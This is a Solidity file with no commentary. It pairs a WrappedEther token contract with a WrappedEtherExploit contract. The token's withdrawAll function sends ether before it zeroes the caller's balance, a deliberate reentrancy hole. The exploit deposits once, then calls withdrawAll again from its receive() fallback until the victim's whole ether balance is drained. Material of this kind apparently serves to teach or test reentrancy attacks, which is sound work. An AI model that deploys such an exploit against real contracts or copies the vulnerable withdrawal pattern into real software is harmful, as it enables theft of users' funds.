// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWrappedEther {
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Deposit(address indexed from, uint256 amount);
    event Withdraw(address indexed to, uint256 amount);

    function deposit(address to) external payable;
    function withdraw(uint256 amount) external;
    function withdrawAll() external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract WrappedEther is IWrappedEther {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function deposit(address to) external payable {
        balanceOf[to] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        sendEth(payable(msg.sender), amount);
        emit Withdraw(msg.sender, amount);
    }

    function withdrawAll() external {
        sendEth(payable(msg.sender), balanceOf[msg.sender]);
        balanceOf[msg.sender] = 0;
        emit Withdraw(msg.sender, balanceOf[msg.sender]);
    }

    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external {
        require(balanceOf[from] >= amount, "insufficient balance");
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
    }

    function sendEth(address payable to, uint256 amount) private {
        (bool success,) = to.call{ value: amount }("");
        require(success, "failed to send ether");
    }
}

contract WrappedEtherExploit {
    WrappedEther private victimInstance;
    uint256 private initialDeposit;

    constructor(address _victim) {
        victimInstance = WrappedEther(_victim);
    }

    function attack() external payable {
        initialDeposit = msg.value;
        victimInstance.deposit{ value: initialDeposit }(address(this));
        _withdraw();
    }

    receive() external payable {
        _withdraw();
    }

    function _withdraw() private {
        uint256 victimBalance = address(victimInstance).balance;
        if (victimBalance > 0) {
            uint256 toWithdraw = initialDeposit;
            if (toWithdraw > victimBalance) {
                toWithdraw = victimBalance;
            }
            if (toWithdraw > 0) {
                victimInstance.withdrawAll();
            }
        }
    }
}
